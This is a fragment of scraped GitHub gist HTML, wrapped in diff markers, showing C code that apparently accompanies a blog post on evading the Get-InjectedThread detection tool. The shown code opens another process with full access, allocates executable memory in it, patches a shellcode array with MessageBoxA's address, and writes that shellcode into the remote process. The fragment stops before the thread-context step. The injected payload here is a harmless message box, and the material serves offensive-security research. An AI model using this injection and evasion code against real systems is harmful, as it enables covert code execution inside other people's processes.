+      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
+    </span>
+
+
+  <div data-view-component="true" class="flash-action">        <a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/" data-view-component="true" class="btn-sm btn">    Show hidden characters
+</a>
+</div>
+</div>
+
+  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+</span>
+
+  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="get_injectedthread-example_setthreadcontext.c">
+        <tbody><tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">unsigned <span class="pl-smi">char</span></span> <span class="pl-s1">shellcode</span>[<span class="pl-c1">256</span>] <span class="pl-c1">=</span> {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC2" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x90</span>, <span class="pl-c1">0x55</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x89</span>, <span class="pl-c1">0xe5</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x31</span>, <span class="pl-c1">0xc9</span>, <span class="pl-c1">0x48</span>, <span class="pl-c1">0x8d</span>, <span class="pl-c1">0x15</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC3" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x14</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x49</span>, <span class="pl-c1">0x89</span>, <span class="pl-c1">0xd0</span>, <span class="pl-c1">0x4d</span>, <span class="pl-c1">0x31</span>, <span class="pl-c1">0xc9</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC4" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x48</span>, <span class="pl-c1">0xb8</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x41</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC5" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xd0</span>, <span class="pl-c1">0xeb</span>, <span class="pl-c1">0xfe</span>, <span class="pl-c1">0x54</span>, <span class="pl-c1">0x68</span>, <span class="pl-c1">0x72</span>, <span class="pl-c1">0x65</span>, <span class="pl-c1">0x61</span>, <span class="pl-c1">0x64</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC6" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0x20</span>, <span class="pl-c1">0x54</span>, <span class="pl-c1">0x65</span>, <span class="pl-c1">0x73</span>, <span class="pl-c1">0x74</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC7" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC8" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC9" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC10" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC11" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC12" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC13" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC14" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC15" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC16" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC17" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC18" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC19" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC20" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC21" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC22" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC23" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC24" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC25" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC26" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span>,</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC27" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">0xff</span>, <span class="pl-c1">0xff</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC28" class="blob-code blob-code-inner js-file-line">};</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC29" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC30" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">int</span> <span class="pl-en">example_switchsuspend</span>(<span class="pl-smi">int</span> <span class="pl-s1">pid</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC31" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">char</span> <span class="pl-s1">currentDir</span>[<span class="pl-c1">MAX_PATH</span>];</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC32" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">SIZE_T</span> <span class="pl-s1">bytesWritten</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC33" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">HANDLE</span> <span class="pl-s1">threadHandle</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC34" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC35" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">HANDLE</span> <span class="pl-s1">processHandle</span> <span class="pl-c1">=</span> <span class="pl-en">OpenProcess</span>(<span class="pl-c1">PROCESS_ALL_ACCESS</span>, false, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC36" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">processHandle</span> <span class="pl-c1">==</span> <span class="pl-c1">INVALID_HANDLE_VALUE</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC37" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not open process with PID %d\n"</span>, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC38" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC39" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC40" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC41" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">alloc</span> <span class="pl-c1">=</span> <span class="pl-en">VirtualAllocEx</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">0</span>, <span class="pl-c1">4096</span>, <span class="pl-c1">MEM_COMMIT</span> | <span class="pl-c1">MEM_RESERVE</span>, <span class="pl-c1">PAGE_EXECUTE_READWRITE</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC42" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">alloc</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC43" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not allocate memory in process\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC44" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC45" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC46" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC47" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">_loadLibrary</span> <span class="pl-c1">=</span> <span class="pl-en">GetProcAddress</span>(<span class="pl-en">LoadLibraryA</span>(<span class="pl-s">"kernel32.dll"</span>), <span class="pl-s">"LoadLibraryA"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L48" class="blob-num js-line-number js-blob-rnum" data-line-number="48"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC48" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">_loadLibrary</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L49" class="blob-num js-line-number js-blob-rnum" data-line-number="49"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC49" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not find address of LoadLibrary\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L50" class="blob-num js-line-number js-blob-rnum" data-line-number="50"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC50" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L51" class="blob-num js-line-number js-blob-rnum" data-line-number="51"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC51" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L52" class="blob-num js-line-number js-blob-rnum" data-line-number="52"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC52" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L53" class="blob-num js-line-number js-blob-rnum" data-line-number="53"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC53" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">*</span>(<span class="pl-smi">DWORD64</span> <span class="pl-c1">*</span>)(<span class="pl-s1">shellcode</span> <span class="pl-c1">+</span> <span class="pl-c1">26</span>) <span class="pl-c1">=</span> (<span class="pl-smi">DWORD64</span>)<span class="pl-en">GetProcAddress</span>(<span class="pl-en">LoadLibraryA</span>(<span class="pl-s">"user32.dll"</span>), <span class="pl-s">"MessageBoxA"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L54" class="blob-num js-line-number js-blob-rnum" data-line-number="54"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC54" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L55" class="blob-num js-line-number js-blob-rnum" data-line-number="55"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC55" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (!<span class="pl-en">WriteProcessMemory</span>(<span class="pl-s1">processHandle</span>, <span class="pl-s1">alloc</span>, <span class="pl-s1">shellcode</span>, <span class="pl-k">sizeof</span>(<span class="pl-s1">shellcode</span>), <span class="pl-c1">&amp;</span><span class="pl-s1">bytesWritten</span>)) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L56" class="blob-num js-line-number js-blob-rnum" data-line-number="56"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC56" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not write to process memory\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L57" class="blob-num js-line-number js-blob-rnum" data-line-number="57"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC57" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L58" class="blob-num js-line-number js-blob-rnum" data-line-number="58"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC58" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L59" class="blob-num js-line-number js-blob-rnum" data-line-number="59"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC59" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Written %d bytes to %p\n"</span>, <span class="pl-s1">bytesWritten</span>, <span class="pl-s1">alloc</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L60" class="blob-num js-line-number js-blob-rnum" data-line-number="60"></td>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-LC60" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_setthreadcontext-c-L61" class="blob-num js-line-number js-blob-rnum" data-line-number="61"></td>
